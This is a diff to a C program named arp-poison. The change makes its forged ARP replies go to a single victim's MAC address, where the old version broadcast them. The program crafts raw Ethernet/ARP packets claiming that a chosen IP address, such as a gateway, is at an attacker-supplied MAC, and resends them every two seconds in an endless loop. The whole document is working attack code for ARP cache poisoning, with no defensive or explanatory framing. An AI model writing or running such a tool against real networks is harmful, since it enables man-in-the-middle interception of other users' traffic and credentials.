@@ -16,63 +16,78 @@
 #define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
 
 int sock;
-void
-usage()
+
+void usage()
 {
-  puts("usage:\t./arp-poison <interface> <gateway ip> <mac addr>");
-  puts("ex:\t./arp-poison eth0 10.1.1.1 aa:bb:cc:dd:ee:ff");
-  exit(1);
+	puts("usage:\t./arp-poison <interface> <ip> <mac> <to_mac>");
+	exit(1);
 }
 
-void
-cleanup()
+void cleanup()
 {
-  close(sock);
-  exit(0);
+	printf("cleaning...\n");
+	close(sock);
+	exit(0);
 }
 
-int
-main(int argc, char ** argv)
+int main(int argc, char ** argv)
 {
-  char packet[PKTLEN];
-  struct ether_header * eth = (struct ether_header *) packet;
-  struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
-  struct sockaddr_ll device;
- 
-  if (argc < 4) {
-    usage();
-  }
+	char packet[PKTLEN];
+	struct ether_header * eth = (struct ether_header *) packet;
+	struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
+	struct sockaddr_ll device;
 
-  sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-  if (sock < 0)
-    perror("socket"), exit(1);
+	if (argc < 5) {
+		usage();
+	}
 
-  signal(SIGINT, cleanup);
+	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+	if (sock < 0)
+		perror("socket"), exit(1);
 
-  sscanf(argv[3], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arp->arp_sha[0],
+	signal(SIGINT, cleanup);
+
+	/* sender */
+  sscanf(argv[3], "%x:%x:%x:%x:%x:%x",  
+					(unsigned int *) &arp->arp_sha[0],
 					(unsigned int *) &arp->arp_sha[1],
 					(unsigned int *) &arp->arp_sha[2],
 					(unsigned int *) &arp->arp_sha[3],
 					(unsigned int *) &arp->arp_sha[4],
 					(unsigned int *) &arp->arp_sha[5]);
 
+	/* source IP */
   sscanf(argv[2], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
-                                 (int *) &arp->arp_spa[1],
-                                 (int *) &arp->arp_spa[2],
-                                 (int *) &arp->arp_spa[3]);
+					(int *) &arp->arp_spa[1],
+					(int *) &arp->arp_spa[2],
+					(int *) &arp->arp_spa[3]);
 
-  memset(eth->ether_dhost, 0xff, ETH_ALEN);//bcast
+	/* target */
+  sscanf(argv[4], "%x:%x:%x:%x:%x:%x",  
+					(unsigned int *) &arp->arp_tha[0],
+					(unsigned int *) &arp->arp_tha[1],
+					(unsigned int *) &arp->arp_tha[2],
+					(unsigned int *) &arp->arp_tha[3],
+					(unsigned int *) &arp->arp_tha[4],
+					(unsigned int *) &arp->arp_tha[5]);
+
+	/* set Ethernet header */ 
+  // memset(eth->ether_dhost, 0xff, ETH_ALEN);//bcast
+  memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
   eth->ether_type = htons(ETH_P_ARP);
 
+	/* set arp header */
   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
   arp->ea_hdr.ar_pro = htons(ETH_P_IP);
   arp->ea_hdr.ar_hln = ETH_ALEN;
   arp->ea_hdr.ar_pln = IP4LEN;
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
-  memset(arp->arp_tha, 0xff, ETH_ALEN);
+
+ // memset(arp->arp_tha, 0xff, ETH_ALEN);
   memset(arp->arp_tpa, 0x00, IP4LEN);
 
+	/* device */
   memset(&device, 0, sizeof(device));
   device.sll_ifindex = if_nametoindex(argv[1]);
   device.sll_family = AF_PACKET;
@@ -81,7 +96,8 @@ main(int argc, char ** argv)
 
   puts("press ctrl+c to exit.");
   while (1) {
-    printf("%s: %s is at %s\n", argv[1], argv[2], argv[3]);
+    printf("%s: hey %s! %s is at %s\n", argv[1], argv[4], 
+	                                    argv[2], argv[3]);
     sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
     sleep(2);
   }
